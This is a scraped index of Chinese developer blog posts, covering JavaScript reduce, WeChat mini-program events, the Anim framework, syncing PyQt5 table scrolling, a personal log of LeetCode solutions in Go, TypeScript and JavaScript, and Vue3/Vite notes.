为数组中的每一个元素依次执行回调函数，不包括数组中被删除或从未被赋值的元素，接受四个参数：初始值（或者上一次回调函数的返回值），当前元素值，当前索引，调用 reduce 的数组。 callback （执行数组中每个值的函数，包含四个参数） 1、previousValue （上一次调用回调返回的值，或者是提供的初始值（initialValue）） 2、currentValue （数组中当前被处理的元素） 3、index （当前元素在数组中的索引） 4、array （调用 reduce 的数组） initialValue （作为第一次调用 callback 的第一个参数。） 2、实例解析 initialValue 参数先看第一个例子： var arr = [1, 2, 3, 4]; var sum = arr.reduce(function(prev, cur, index, arr) &#123; console.log(prev, cur, index); return prev + cur; &#125;) console.log(arr, sum); 打印结果： 1 2 1 3 3 2 6 4 3 [1, 2, 3, 4] 10 这里可以看出，上面的例子index是从1开始的，第一次的prev的值是数组的第一个值。数组长度是4，但是reduce函数循环3次。 再看第二个例子： var arr = [1, 2, 3, 4]; var sum = arr.reduce(function(prev, cur, index, arr) &#123; console.log(prev, cur, index); return prev + cur; &#125;，0) //注意这里设置了初始值 console.log(arr, sum); 打印结果： 0 1 0 1 2 1 3 3 2 6 4 3 [1, 2, 3, 4] 10 这个例子index是从0开始的，第一次的prev的值是我们设置的初始值0，数组长度是4，reduce函数循环4次。 结论：如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引0开始。 注意：如果这个数组为空，运用reduce是什么情况？ var arr = []; var sum = arr.reduce(function(prev, cur, index, arr) &#123; console.log(prev, cur, index); return prev + cur; &#125;) //报错，\"TypeError: Reduce of empty array with no initial value\" 但是要是我们设置了初始值就不会报错，如下： var arr = []; var sum = arr.reduce(function(prev, cur, index, arr) &#123; console.log(prev, cur, index); return prev + cur; &#125;，0) console.log(arr, sum); // [] 0 所以一般来说我们提供初始值通常更安全 3、reduce的简单用法当然最简单的就是我们常用的数组求和，求乘积了。 var arr = [1, 2, 3, 4]; var sum = arr.reduce((x,y)=>x+y) var mul = arr.reduce((x,y)=>x*y) console.log( sum ); //求和，10 console.log( mul ); //求乘积，24 4、reduce的高级用法（1）计算数组中每个元素出现的次数 let names = ['Alice', 'Bob', 'Tiff', 'Bruce', 'Alice']; let nameNum = names.reduce((pre,cur)=>&#123; if(cur in pre)&#123; pre[cur]++ &#125;else&#123; pre[cur] = 1 &#125; return pre &#125;,&#123;&#125;) console.log(nameNum); //&#123;Alice: 2, Bob: 1, Tiff: 1, Bruce: 1&#125; （2）数组去重 let arr = [1,2,3,4,4,1] let newArr = arr.reduce((pre,cur)=>&#123; if(!pre.includes(cur))&#123; return pre.concat(cur) &#125;else&#123; return pre &#125; &#125;,[]) console.log(newArr);// [1, 2, 3, 4] （3）将二维数组转化为一维 let arr = [[0, 1], [2, 3], [4, 5]] let newArr = arr.reduce((pre,cur)=>&#123; return pre.concat(cur) &#125;,[]) console.log(newArr); // [0, 1, 2, 3, 4, 5] （3）将多维数组转化为一维 let arr = [[0, 1], [2, 3], [4,[5,6,7]]] const newArr = function(arr)&#123; return arr.reduce((pre,cur)=>pre.concat(Array.isArray(cur)?newArr(cur):cur),[]) &#125; console.log(newArr(arr)); //[0, 1, 2, 3, 4, 5, 6, 7] （4）、对象里的属性求和 var result = [ &#123; subject: 'math', score: 10 &#125;, &#123; subject: 'chinese', score: 20 &#125;, &#123; subject: 'english', score: 30 &#125; ]; var sum = result.reduce(function(prev, cur) &#123; return cur.score + prev; &#125;, 0); console.log(sum) //60 作者：littleTank链接：https://www.jianshu.com/p/e375ba1cfc47来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"},{"title":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别","path":"/post/3ceb.html","text":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别事件分类事件分为冒泡事件和非冒泡事件 冒泡事件：当一个组件上的事件被触发后，该事件会向父节点传递。 非冒泡事件：当一个组件上的事件被触发后，该事件不会向父节点传递。 事件的绑定： bind和catch都是用来绑定事件的，与 bind 不同， catch 会阻止事件向上冒泡 &lt;view id=\"outer\" bindtap=\"handleTap1\"> outer view &lt;view id=\"middle\" catchtap=\"handleTap2\"> middle view &lt;view id=\"inner\" bindtap=\"handleTap3\"> inner view &lt;/view> &lt;/view> &lt;/view> 上例中，点击 inner view 会先后调用handleTap3和handleTap2(因为tap事件会冒泡到 middle view，而 middle view 阻止了 tap 事件冒泡，不再向父节点传递)，点击 middle view 会触发handleTap2，点击 outer view 会触发handleTap1 事件的捕获阶段 \\1. 事件是有两个阶段的：捕获阶段 和 冒泡阶段， 且捕获阶段位于冒泡阶段之前。 \\2. 在捕获阶段中，事件到达节点的顺序与冒泡阶段恰好相反 \\3. 在捕获阶段监听事件时，可以采用capture-bind、capture-catch关键字，后者将中断捕获阶段和取消冒泡阶段 示例： 点击 inner view 会先后调用handleTap2、handleTap4、handleTap3、handleTap1 &lt;view id=\"outer\" bind:touchstart=\"handleTap1\" capture-bind:touchstart=\"handleTap2\"> outer view &lt;view id=\"inner\" bind:touchstart=\"handleTap3\" capture-bind:touchstart=\"handleTap4\"> inner view &lt;/view> &lt;/view> 如果把上面的代码改成如下，将只会触发handleTap2 &lt;view id=\"outer\" bind:touchstart=\"handleTap1\" capture-catch:touchstart=\"handleTap2\"> outer view &lt;view id=\"inner\" bind:touchstart=\"handleTap3\" capture-bind:touchstart=\"handleTap4\"> inner view &lt;/view> 转载自： https://www.cnblogs.com/hzhuxin/p/15074300.html"},{"title":"Anim小程序开发框架","path":"/post/f002.html","text":"Anim小程序开发框架介绍Anim 框架是基于原生小程序 Mina 框架开发的，采用 rollup 打包，只需要引入 anim.js 即可快速使用。 特点： 基于小程序 runtime 的增强型开发框架，无需引入各类编译环境，开箱即用。 可兼容原生使用，无需对项目进行大改，按需使用即可。 补充多种原生小程序开发框架缺失功能，提高大型工程化项目的可维护性，让开发更省心。 引入压缩后的文件大小不到 10 kb。 # 使用# 普通引入通过 CDN 下载后，放置到小程序项目内部任意地方。推荐引入后挂载到 getApp 上，减少重复代码。 下载地址： anim.js (min 30 kb)，下载 anim.min.js (min 10 kb)，下载 // app.js const Anim = require('./lib/anim.js') App(&#123; onLaunch() &#123; this.Anim = Anim &#125; &#125;) // pages/index/index.js // 可以使用增强型 Anim.Page const &#123; Anim &#125; = getApp() Anim.Page(&#123; data: &#123;&#125;, computed: &#123;&#125; &#125;) # 小程序 npm 方式引入正在开发小程序 npm 方式引入。 # 能力# 计算属性 Computed模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让模板过重且难以维护。巧妙利用 computed 方法，可以让整体代码更简洁清晰。 计算属性是基于它们的响应式依赖进行缓存的，只在相关响应式依赖发生改变时它们才会重新求值，开发者不需要关注依赖的数据是何时更新的。 Anim.Page(&#123; data: &#123; a: 1 &#125;, computed: &#123; b() &#123; return this.data.a + 2 &#125; &#125; &#125;) # 监听 Watch当你有一些数据需要随着其它数据变动而变动时，可以用 watch 监听数据的变化，然后执行一些逻辑。 Anim.Page(&#123; data: &#123; a: 1 &#125;, watch: &#123; a(newVal, oldVal) &#123; console.log('a', newVal, oldVal) &#125; &#125; &#125;) # 混入 Mixin混入 (mixin) 可以帮助开发者更好的组织页面代码逻辑，抽象出可复用的逻辑，并分发到各个页面内。当页面使用 mixins 功能时，会将配置选项按一定的规则和页面的配置项进行合并。 支持全局混入，可以让全局共享配置。 const myMixin = &#123; onLoad() &#123; this.showMessage() &#125;, showMessage() &#123; console.log('global show Message') &#125; &#125; Anim.Page.mixin(myMixin) 支持当前页面混入 const myMixin = &#123; onLoad() &#123; this.showMessage() &#125;, showMessage() &#123; console.log('show Message') &#125; &#125; Anim.Page(&#123; mixins: [myMixin], onLoad() &#123; console.log('show another message') &#125; &#125;) # 状态管理使用 wedux 进行全局状态管理，wedux 对数据进行了 Proxy 代理，使得所有使用该 Store 数据的地方都会被统一通知并更新。 Anim.Page(&#123; store: (state) => &#123; return &#123; count: state.counter.count &#125; &#125; &#125;) # 路由增强更加符合前端路由库的方法集成。后续可考虑在前端层维护一个路由栈，可以除了后退还可以支持前进等需求。URL 和参数不再需要手动拼装，舒服使用。并且参数支持更加复杂的解析，支持多层嵌套，数组参数。提高小程序开发的便利性。 # API 增强所有的方法都是 Promise 化。 this.$router.navigateTo(&#123; path: string, query: Object&#125;).then(resolve) this.$router.navigateBack(delta: number).then(resolve) this.$router.redirectTo(&#123; path: string, query: Object&#125;).then(resolve) this.$router.reLaunch(&#123; path: string, query: Object&#125;).then(resolve) this.$router.switchTab(&#123; path: string, query: Object&#125;).then(resolve) # 支持复杂的 query 数据微信小程序暂时不支持复杂的 query 解析，在 Anim 框架下重新对 URL 做了解析，支持多层嵌套模式和数组参数。 // index.js Anim.Page(&#123; onLoad() &#123; this.$router.navigateTo(&#123; path: '/pages/another/another', query: &#123; a: &#123; b: &#123; c: 3 &#125;&#125;, d: [1, 2, 3], e: [&#123;key: 'val'&#125;, &#123;key: 'val'&#125;] &#125; &#125;) &#125; &#125;) // another.js Anim.Page(&#123; onLoad() &#123; // 可以获取复杂数据 console.log(this.$route.query) &#125; &#125;) # 突破小程序 10 层限制通过 Anim 维护的路由栈，还可以突破 10 层限制，超过十层路由时自动通过 Redirect 方法来进行路由跳转。 # 路由响应路由数据会存放到 this.data.$route 中，方便 UI 使用。 &lt;view>&#123;&#123;$route.query.id&#125;&#125;&lt;/view>"},{"title":"pyqt5 多个tableWidget联动滚动","path":"/post/85cd.html","text":"项目中遇到了一个需求： 开发时用到了三个tableWidget分别展示数据，但数据过多时三个表就显得比较杂乱，三表行之间无法同时滚动必然带来不好的体验，所以需要是三个tableWidget同时滚动； 先上code： import sys from PyQt5.QtCore import QEvent from PyQt5.QtWidgets import (QWidget, QTableWidget, QHeaderView, QHBoxLayout, QApplication, QTableWidgetItem, QAbstractItemView) class MyEvent(QEvent): # idType = QEvent.registerEventType() def __init__(self, data): self.data = data print(\"MyEvent.idType \", data) def get_data(self): return self.data class TableWidgetDemo(QWidget): def __init__(self): super(TableWidgetDemo, self).__init__() self.initUI() def initUI(self): self.setWindowTitle(\"QTableWidget演示\") self.resize(430, 230); layout = QHBoxLayout() tablewidget = QTableWidget() tablewidget.setRowCount(44) tablewidget.setColumnCount(3) tablewidget.setHorizontalHeaderLabels(['姓名', '年龄', '籍贯']) nameItem1 = QTableWidgetItem(\"张飞\") tablewidget.setItem(0, 0, nameItem1) ageItem1 = QTableWidgetItem(\"24\") tablewidget.setItem(0, 1, ageItem1) jgItem1 = QTableWidgetItem(\"河北\") tablewidget.setItem(0, 2, jgItem1) nameItem2 = QTableWidgetItem(\"关羽\") tablewidget.setItem(1, 0, nameItem2) ageItem2 = QTableWidgetItem(\"25\") tablewidget.setItem(1, 1, ageItem2) jgItem2 = QTableWidgetItem(\"河南\") tablewidget.setItem(1, 2, jgItem2) # 禁止编辑 tablewidget.setEditTriggers(QAbstractItemView.NoEditTriggers) # 整行选择 tablewidget.setSelectionBehavior(QAbstractItemView.SelectRows) # 调整列和行的大小 tablewidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) tablewidget.verticalHeader().setSectionResizeMode(QHeaderView.Stretch) # 设置水平竖直表头是否显示 # tablewidget.horizontalHeader().setVisible(False) # tablewidget.verticalHeader().setVisible(False) # 设置竖直表头标题，五特殊要求可以不用设置 # tablewidget.setVerticalHeaderLabels([\"a\",\"b\"]) # 隐藏表格线，False隐藏 tablewidget.setShowGrid(False) self.scrollBar = tablewidget.verticalScrollBar() self.scrollBar.valueChanged.connect(self.verticalScrollBarChanged) # self.scrollBar.setValue(200) # -------------------------- tablewidget2 = QTableWidget() tablewidget2.setRowCount(44) tablewidget2.setColumnCount(3) tablewidget2.setHorizontalHeaderLabels(['姓名', '年龄', '籍贯']) nameItem1 = QTableWidgetItem(\"张飞\") tablewidget2.setItem(0, 0, nameItem1) ageItem1 = QTableWidgetItem(\"24\") tablewidget2.setItem(0, 1, ageItem1) jgItem1 = QTableWidgetItem(\"河北\") tablewidget2.setItem(0, 2, jgItem1) nameItem2 = QTableWidgetItem(\"关羽\") tablewidget2.setItem(1, 0, nameItem2) ageItem2 = QTableWidgetItem(\"25\") tablewidget2.setItem(1, 1, ageItem2) jgItem2 = QTableWidgetItem(\"河南\") tablewidget2.setItem(1, 2, jgItem2) # 禁止编辑 tablewidget2.setEditTriggers(QAbstractItemView.NoEditTriggers) # 整行选择 tablewidget2.setSelectionBehavior(QAbstractItemView.SelectRows) # 调整列和行的大小 tablewidget2.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) tablewidget2.verticalHeader().setSectionResizeMode(QHeaderView.Stretch) # 设置水平竖直表头是否显示 # tablewidget.horizontalHeader().setVisible(False) # tablewidget.verticalHeader().setVisible(False) # 设置竖直表头标题，五特殊要求可以不用设置 # tablewidget.setVerticalHeaderLabels([\"a\",\"b\"]) # 隐藏表格线，False隐藏 tablewidget2.setShowGrid(False) self.scrollBar2 = tablewidget2.verticalScrollBar() self.scrollBar2.valueChanged.connect(self.verticalScrollBarChanged) # self.scrollBar.setValue(200) layout.addWidget(tablewidget) layout.addWidget(tablewidget2) self.setLayout(layout) def verticalScrollBarChanged(self, e): self.scrollBar.setValue(e) self.scrollBar2.setValue(e) if __name__ == '__main__': app = QApplication(sys.argv) example = TableWidgetDemo() example.show() sys.exit(app.exec_()) 关键在于监听到滚动条的变化，将滚动距离同时设置给其他TableWidget tablewidget2.verticalScrollBar() 可以拿到tablewidget的滚动条 self.scrollBar2.valueChanged.connect(self.verticalScrollBarChanged) 将变化事件绑定到handleTextChanged方法 self.scrollBar.setValue(e) 方法里面再setValue(e)赋值 之后再将其他的滚动条隐藏优化就可以了"},{"title":"Leetcode每日一题","path":"/post/266d.html","text":"## title: ### time: ### link: ### code: title:1582. 二进制矩阵中的特殊位置time:9.4code:function numSpecial(mat: number[][]): number &#123; let count: number = 0; for (let i: number = 0; i &lt; mat.length; i++) &#123; for (let j: number = 0; j &lt; mat[i].length; j++) &#123; if (mat[i][j] == 1 &amp;&amp; mat[i].indexOf(1) == j &amp;&amp; mat[i].lastIndexOf(1) == j) &#123; let list: Array&lt;number> = [] mat.forEach(item => &#123; list.push(item[j]) &#125;) if (list.lastIndexOf(1) == i &amp;&amp; list.indexOf(1) == i) &#123; count++ &#125; &#125; &#125; &#125; return count; &#125;; title:646. 最长数对链time:9.4code:function findLongestChain(pairs: number[][]): number &#123; const n:number = pairs.length; pairs.sort((a, b) => a[0] - b[0]); const dp = new Array(n).fill(1); for (let i :number= 0; i &lt; n; i++) &#123; for (let j:number = 0; j &lt; i; j++) &#123; if (pairs[i][0] > pairs[j][1]) &#123; dp[i] = Math.max(dp[i], dp[j] + 1); &#125; &#125; &#125; return dp[n - 1]; &#125;; title:464. 我能赢吗time:5.22code:func canIWin(maxChoosableInteger, desiredTotal int) bool &#123; if (1+maxChoosableInteger)*maxChoosableInteger/2 &lt; desiredTotal &#123; return false &#125; dp := make([]int8, 1&lt;&lt;maxChoosableInteger) for i := range dp &#123; dp[i] = -1 &#125; var dfs func(int, int) int8 dfs = func(usedNum, curTot int) (res int8) &#123; dv := &amp;dp[usedNum] if *dv != -1 &#123; return *dv &#125; defer func() &#123; *dv = res &#125;() for i := 0; i &lt; maxChoosableInteger; i++ &#123; if usedNum>>i&amp;1 == 0 &amp;&amp; (curTot+i+1 >= desiredTotal || dfs(usedNum|1&lt;&lt;i, curTot+i+1) == 0) &#123; return 1 &#125; &#125; return &#125; return dfs(0, 0) == 1 &#125; title:417. 太平洋大西洋水流问题time:link:code:796. 旋转字符串time:2022&#x2F;04&#x2F;07 10:28 link:https://leetcode-cn.com/problems/rotate-string/ code:/** * @param &#123;string&#125; s * @param &#123;string&#125; goal * @return &#123;boolean&#125; */ var rotateString = function (s, goal) &#123; let length = s.length; let s1 = s let sr = s.concat(s1) let i = 0; let j = length; while (length--) &#123; let x = sr.slice(i, j); if (x == goal) &#123; return true &#125; i++; j++; &#125; return false &#125;; let s = \"abcde\"; let goal = \"abced\" console.log(rotateString(s, goal)) 806. 写字符串需要的行数time:2022&#x2F;04&#x2F;12 19:36 link:https://leetcode-cn.com/problems/number-of-lines-to-write-string/ code:/** * @param &#123;number[]&#125; widths * @param &#123;string&#125; s * @return &#123;number[]&#125; */ var numberOfLines = function (widths, s) &#123; let col = 0 let row = 0 let w = 0 let fail = 0 for (let i = 0; i &lt; s.length; i++) &#123; let index = Number(s[i]) - 97 w = widths[index] col += w fail = col if (col == 100) &#123; row++ col = 0 &#125; else if (col > 100) &#123; i-- row++ col = 0 &#125; &#125; console.log(row, fail) &#125;; let widths = [10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10] let S = \"abcdefghijklmnopqrstuvwxyz\" numberOfLines(widths,S) 1672. 最富有客户的资产总量time2022&#x2F;04&#x2F;14 19:10 link:https://leetcode-cn.com/problems/richest-customer-wealth/ code/** * @param &#123;number[][]&#125; accounts * @return &#123;number&#125; */ var maximumWealth = function (accounts) &#123; let ans=[] for(let i=0;i&lt;accounts.length;i++)&#123; let sum=0; for(let j=0;j&lt;accounts[i].length;j++)&#123; sum+=accounts[i][j] &#125; ans.push(sum) &#125; return Math.max(...ans) &#125;; let accounts = [[1, 2, 3], [3, 2, 1]] console.log(maximumWealth(accounts)) 253 . 会议室 IItime:2022&#x2F;04&#x2F;14 21:22 linkhttps://leetcode-cn.com/problems/meeting-rooms-ii/submissions/ code 1446. 连续字符time:2021&#x2F;12&#x2F;12 22:12 code:package main import \"fmt\" func main() &#123; s := \"\" fmt.Scanln(&amp;s) ans := maxPower(s) fmt.Println(ans) &#125; func maxPower(s string) int &#123; ans, cnt := 1, 1 for i := 0; i &lt; len(s)-1; i++ &#123; if s[i] == s[i+1] &#123; cnt += 1 if ans &lt; cnt &#123; ans = cnt &#125; &#125; else &#123; cnt = 1 &#125; &#125; return ans &#125; 506. 相对名次time:code:807. 保持城市天际线time:2021&#x2F;12&#x2F;13 11:17 codepackage main import \"fmt\" func main() &#123; grid := [][]int&#123; &#123;3, 0, 8, 4&#125;, &#123;2, 4, 5, 7&#125;, &#123;9, 2, 6, 3&#125;, &#123;0, 3, 1, 0&#125;, &#125; ans := maxIncreaseKeepingSkyline(grid) fmt.Println(ans) &#125; func maxIncreaseKeepingSkyline(grid [][]int) int &#123; ans := 0 rowMax := make([]int, len(grid)) colMax := make([]int, len(grid)) for i := 0; i &lt; len(grid); i++ &#123; for j := 0; j &lt; len(grid); j++ &#123; rowMax[i] = Max(rowMax[i], grid[i][j]) colMax[j] = Max(colMax[j], grid[i][j]) &#125; &#125; for i := 0; i &lt; len(grid); i++ &#123; for j := 0; j &lt; len(grid); j++ &#123; ans = ans + (Min(rowMax[i], colMax[j]) - grid[i][j]) &#125; &#125; return ans &#125; func Max(a, b int) int &#123; if a > b &#123; return a &#125; else &#123; return b &#125; &#125; func Min(a, b int) int &#123; if a > b &#123; return b &#125; else &#123; return a &#125; &#125; 1518. 换酒问题time:2021&#x2F;12&#x2F;17 21:36 code:package main import \"fmt\" func main() &#123; var numBottles, numExchange int fmt.Scanf(\"%d %d\", &amp;numBottles, &amp;numExchange) ans := numWaterBottles(numBottles, numExchange) fmt.Println(ans) &#125; func numWaterBottles(numBottles int, numExchange int) int &#123; sum := numBottles for numBottles >= numExchange &#123; s := numBottles % numExchange sum += numBottles / numExchange numBottles = numBottles/numExchange + s &#125; return sum &#125; 419. 甲板上的战舰time： 2021&#x2F;12&#x2F;18 11:08 code:package main import \"fmt\" func main() &#123; var board = [][]byte&#123;&#125; fmt.Println(countBattleships(board)) &#125; func countBattleships(board [][]byte) (ans int) &#123; m, n := len(board), len(board[0]) for i, row := range board &#123; for j, ch := range row &#123; if ch == 'X' &#123; row[j] = '.' for k := j + 1; k &lt; n &amp;&amp; row[k] == 'X'; k++ &#123; row[k] = '.' &#125; for k := i + 1; k &lt; m &amp;&amp; board[k][j] == 'X'; k++ &#123; board[k][j] = '.' &#125; ans++ &#125; &#125; &#125; return &#125; 997. 找到小镇的法官time: 2021&#x2F;12&#x2F;19 21:14 code:package main import \"fmt\" func main() &#123; trust := [][]int&#123; &#123;1, 3&#125;, &#123;1, 4&#125;, &#123;2, 3&#125;, &#123;2, 4&#125;, &#123;4, 3&#125;, &#125; n := 4 ans := findJudge(n, trust) fmt.Println(ans) &#125; func findJudge(n int, trust [][]int) int &#123; if n == 1 &#123; return 1 &#125; List1 := make(map[int]int, 0) List2 := make(map[int]int, 0) for _, v := range trust &#123; List1[v[0]]++ List2[v[1]]++ &#125; for f, x := range List2 &#123; _, ok := List1[f] if !ok &amp;&amp; x == n-1 &#123; return f &#125; &#125; return -1 &#125; 1154. 一年中的第几天time: 2021&#x2F;12&#x2F;21 22:41 code:package main import ( \"fmt\" \"strconv\" \"strings\" ) func main() &#123; s := \"2004-03-01\" ans := dayOfYear(s) fmt.Println(ans) &#125; func dayOfYear(date string) int &#123; year, _ := strconv.Atoi(strings.Split(date, \"-\")[0]) mon, _ := strconv.Atoi(strings.Split(date, \"-\")[1]) day, _ := strconv.Atoi(strings.Split(date, \"-\")[2]) sum := day if mon > 2 &#123; Flag := Year(year) if Flag == 1 &#123; sum += 29 &#125; else &#123; sum += 28 &#125; &#125; for i := mon - 1; i > 0; i-- &#123; if i != 2 &#123; sum += montn(i) &#125; &#125; return sum &#125; func Year(year int) int &#123; if year%4 == 0 &amp;&amp; year%100 != 0 || year%400 == 0 &#123; return 1 &#125; else &#123; return 0 &#125; &#125; func montn(mon int) int &#123; if mon == 1 || mon == 3 || mon == 5 || mon == 7 || mon == 8 || mon == 10 || mon == 12 &#123; return 31 &#125; else &#123; return 30 &#125; &#125; 686. 重复叠加字符串匹配time:2021&#x2F;12&#x2F;22 16:11 code:package main import ( \"fmt\" \"strings\" ) func main() &#123; a := \"abcabcabcabc\" b := \"abac\" ans := repeatedStringMatch(a, b) fmt.Println(ans) &#125; func repeatedStringMatch(a string, b string) int &#123; //flag := strings.Contains(b, a) //if flag &#123; for _, v := range b &#123; if strings.Contains(a, string(v)) == false &#123; return -1 &#125; &#125; count := 0 str := \"\" x := strings.Contains(str, b) for x == false &#123; str += a x = strings.Contains(str, b) count++ if count>=2*len(a)+len(b)&#123; return -1 &#125; &#125; return count //&#125; else &#123; // return -1 //&#125; &#125; 1001. 网格照明time:code:func gridIllumination(n int, lamps, queries [][]int) []int &#123; type pair struct&#123; x, y int &#125; points := map[pair]bool&#123;&#125; row := map[int]int&#123;&#125; col := map[int]int&#123;&#125; diagonal := map[int]int&#123;&#125; antiDiagonal := map[int]int&#123;&#125; for _, lamp := range lamps &#123; r, c := lamp[0], lamp[1] p := pair&#123;r, c&#125; if points[p] &#123; continue &#125; points[p] = true row[r]++ col[c]++ diagonal[r-c]++ antiDiagonal[r+c]++ &#125; ans := make([]int, len(queries)) for i, query := range queries &#123; r, c := query[0], query[1] if row[r] > 0 || col[c] > 0 || diagonal[r-c] > 0 || antiDiagonal[r+c] > 0 &#123; ans[i] = 1 &#125; for x := r - 1; x &lt;= r+1; x++ &#123; for y := c - 1; y &lt;= c+1; y++ &#123; if x &lt; 0 || y &lt; 0 || x >= n || y >= n || !points[pair&#123;x, y&#125;] &#123; continue &#125; delete(points, pair&#123;x, y&#125;) row[x]-- col[y]-- diagonal[x-y]-- antiDiagonal[x+y]-- &#125; &#125; &#125; return ans &#125; 1342. 将数字变成 0 的操作次数time: 2022&#x2F;01&#x2F;31 13:39 code:package main // func main() &#123; // x := 123 // ans := numberOfSteps(x) // fmt.Println(ans) // &#125; func numberOfSteps(num int) int &#123; count := 0 for num != 0 &#123; if num%2 == 0 &#123; num = num / 2 count++ &#125; else &#123; num = num - 1 count++ &#125; &#125; return count &#125; 1491. 去掉最低工资和最高工资后的工资平均值time: 2022&#x2F;01&#x2F;31 18:06 code:package main import \"fmt\" func main() &#123; salary := []int&#123;8000, 9000, 2000, 3000, 6000, 1000&#125; ans := average2(salary) fmt.Println(ans) &#125; func average2(salary []int) float64 &#123; M := salary[0] N := salary[0] var sum float64 for item := range salary &#123; sum = sum + float64(salary[item]) if salary[item] > M &#123; M = salary[item] &#125; if salary[item] &lt; N &#123; N = salary[item] &#125; &#125; return (sum - float64(M) - float64(N)) / float64(len(salary)-2) &#125; func average(salary []int) float64 &#123; M := max(salary) N := min(salary) var sum float64 for j := 0; j &lt; len(salary); j++ &#123; if j != M &amp;&amp; j != N &#123; sum = sum + float64(salary[j]) &#125; &#125; return sum / float64(len(salary)-2) &#125; func max(salary []int) int &#123; max := 0 for i := 1; i &lt; len(salary); i++ &#123; if salary[max] &lt; salary[i] &#123; max = i &#125; &#125; return max &#125; func min(salary []int) int &#123; min := 0 for i := 1; i &lt; len(salary); i++ &#123; if salary[min] > salary[i] &#123; min = i &#125; &#125; return min &#125; 1523. 在区间范围内统计奇数数目time:2022&#x2F;01&#x2F;31 13:53 code:package main // import \"fmt\" // func main() &#123; // low := 3 // high := 7 // x := countOdds(low, high) // fmt.Println(x) // &#125; func countOdds(low int, high int) int &#123; if low%2 == 0 &amp;&amp; high%2 == 0 &#123; return (high - low) / 2 &#125; else &#123; return (high-low)/2 + 1 &#125; &#125; 2000. 反转单词前缀time:2022&#x2F;02&#x2F;03 15:09 code:package main import ( \"fmt\" \"strings\" ) func main() &#123; word := \"abcd\" var ch byte = 'z' ans := reversePrefix(word, ch) fmt.Println(ans) &#125; func reversePrefix(word string, ch byte) string &#123; index := strings.IndexByte(word, ch) if index == -1 &#123; return word &#125; ans := reverse(word, index) return ans &#125; func reverse(str string, index int) string &#123; // write code here r := []rune(str) for i, j := 0, index; i &lt; j; i, j = i+1, j-1 &#123; r[i], r[j] = r[j], r[i] &#125; return string(r) &#125; 1414. 和为 K 的最少斐波那契数字数目time:2022&#x2F;02&#x2F;03 15:56 code:package main import \"fmt\" func main() &#123; k := 19 ans := findMinFibonacciNumbers(k) fmt.Println(ans) &#125; func findMinFibonacciNumbers(k int) int &#123; num := []int&#123;1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368, 75025, 121393, 196418, 317811, 514229, 832040, 1346269, 2178309, 3524578, 5702887, 9227465, 14930352, 24157817, 39088169, 63245986, 102334155, 165580141, 267914296, 433494437, 701408733&#125; //num := []int&#123;1, 2, 3, 5, 8, 13, 21, 34&#125; count := 0 for i := len(num) - 1; i >= 0; i-- &#123; if k == 0 &#123; break &#125; if num[i] &lt;= k &#123; count++ k -= num[i] &#125; &#125; return count &#125; 1725. 可以形成最大正方形的矩形数目time:2022&#x2F;02&#x2F;05 14:37 code:package main import \"fmt\" func main() &#123; rectangles := [][]int&#123;&#123;5, 8&#125;, &#123;3, 9&#125;, &#123;3, 12&#125;&#125; ans := countGoodRectangles(rectangles) fmt.Println(ans) &#125; func countGoodRectangles(rectangles [][]int) int &#123; num := make(map[int]int, 0) for item := range rectangles &#123; if rectangles[item][0] &lt; rectangles[item][1] &#123; num[rectangles[item][0]]++ &#125; else &#123; num[rectangles[item][1]]++ &#125; &#125; ans := 0 for i := range num &#123; fmt.Println(i) if i > ans &#123; ans = i &#125; &#125; return num[ans] &#125; 1748. 唯一元素的和time:2022&#x2F;02&#x2F;06 19:47 code:package main import \"fmt\" func main() &#123; nums := []int&#123;1, 2, 3, 4,5&#125; ans := sumOfUnique(nums) fmt.Println(ans) &#125; func sumOfUnique(nums []int) int &#123; m := make(map[int]int, 0) for i := range nums &#123; m[nums[i]]++ &#125; sum := 0 for key, value := range m &#123; if value == 1 &#123; sum += key &#125; &#125; return sum &#125;"},{"title":"Vue3学习笔记","path":"/post/21bc.html","text":"Vue31.Vite搭建Vue3项目全局安装 Vitenpm install -g create-vite-app 使用 Vite 创建 Vue3 项目create-vite-app vue3-vite 可以发现瞬间创建完成。 运行cd vue3-vite npm install (or &#96;yarn&#96;) npm run dev (or &#96;yarn dev&#96;) vite冷服务 热更新 Rollup打包 2.从VUE2到VUE3新特性Composition API通过创建 Vue 组件，我们可以将界面中重复的部分连同其功能一起提取为可重用的代码段。仅此一项就可以使我们的应用在可维护性和灵活性方面走得相当远。然而，我们的经验已经证明，光靠这一点可能并不够，尤其是当你的应用变得非常大的时候——想想几百个组件。处理这样的大型应用时，共享和重用代码变得尤为重要。 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-05-31 17:22:40 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-05-31 17:27:05 *&#x2F; &lt;template&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; &lt;!-- &lt;button @click&#x3D;&quot;count++&quot;&gt;count is: &#123;&#123; count &#125;&#125;&lt;&#x2F;button&gt; --&gt; &lt;p&gt; Edit &lt;code&gt;components&#x2F;HelloWorld.vue&lt;&#x2F;code&gt; to test hot module replacement. &lt;&#x2F;p&gt; &lt;p&gt;&#123;&#123; data.counter &#125;&#125;&lt;&#x2F;p&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; reactive，computed &#125; from &quot;@vue&#x2F;reactivity&quot;; export default &#123; name: &quot;HelloWorld&quot;, props: &#123; msg: String, &#125;, &#x2F;&#x2F; data() &#123; &#x2F;&#x2F; return &#123; &#x2F;&#x2F; count: 0, &#x2F;&#x2F; &#125;; &#x2F;&#x2F; &#125;, setup() &#123; const data &#x3D; reactive(&#123; counter: 1, doublecounter: computed(() &#x3D;&gt; data.counter * 2) &#125;); return &#123; data &#125;; &#125;, &#125;; &lt;&#x2F;script&gt; setup等同于原data，通过reactive定义变量病赋值到data，再return出去，就可以在template用双大括号使用，计算特性：doublecounter的定义，注意需要import computed 